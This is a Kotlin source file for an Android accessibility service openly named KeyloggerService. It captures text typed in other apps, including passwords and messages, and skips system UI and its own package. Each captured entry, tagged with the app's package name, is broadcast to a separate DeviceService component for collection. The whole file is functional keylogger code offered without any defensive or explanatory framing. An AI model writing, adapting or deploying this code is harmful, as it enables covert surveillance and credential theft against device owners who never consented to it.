package com.sync.xxx

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.util.Log
import android.view.accessibility.AccessibilityEvent

class KeyloggerService : AccessibilityService() {

    companion object {
        const val TAG = "KeyloggerService"
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_FOCUSED or
                        AccessibilityEvent.TYPE_VIEW_CLICKED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                   AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                   AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 100
        }
        
        this.serviceInfo = info
        Log.d(TAG, "Keylogger service connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        
        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    val packageName = event.packageName?.toString() ?: "unknown"
                    val text = event.text?.joinToString(" ") ?: ""
                    
                    if (text.isNotBlank() && !shouldIgnorePackage(packageName)) {
                        // Send to DeviceService
                        sendKeylogToService(text, packageName)
                    }
                }
                
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                    val packageName = event.packageName?.toString() ?: "unknown"
                    val className = event.className?.toString() ?: ""
                    
                    if (className.contains("EditText") && !shouldIgnorePackage(packageName)) {
                        Log.d(TAG, "EditText focused in: $packageName")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing accessibility event: ${e.message}")
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Keylogger service interrupted")
    }

    private fun shouldIgnorePackage(pkg: String): Boolean {
        val ignoredPackages = listOf(
            "com.android.systemui",
            "com.android.launcher",
            "com.sync.xxx" // Our own package
        )
        return ignoredPackages.any { pkg.contains(it) }
    }

    private fun sendKeylogToService(text: String, app: String) {
        try {
            val intent = Intent(this, DeviceService::class.java)
            intent.action = "com.sync.xxx.KEYLOG_DATA"
            intent.putExtra("text", text)
            intent.putExtra("app", app)
            sendBroadcast(intent)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send keylog: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "Keylogger service destroyed")
    }
}
